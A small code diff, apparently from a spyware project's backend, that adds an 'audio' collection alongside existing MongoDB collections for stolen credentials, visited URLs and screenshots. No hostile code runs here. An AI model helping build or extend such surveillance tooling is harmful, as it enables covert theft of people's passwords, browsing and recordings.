@@ -5,3 +5,4 @@ db = client['Spyware']  # Use your database name
 credentials = db['credentials']     # Use your collection name
 urlsvisited=db['urlvisited']
 screenshots = db['screenshots']
+audios = db['audio']
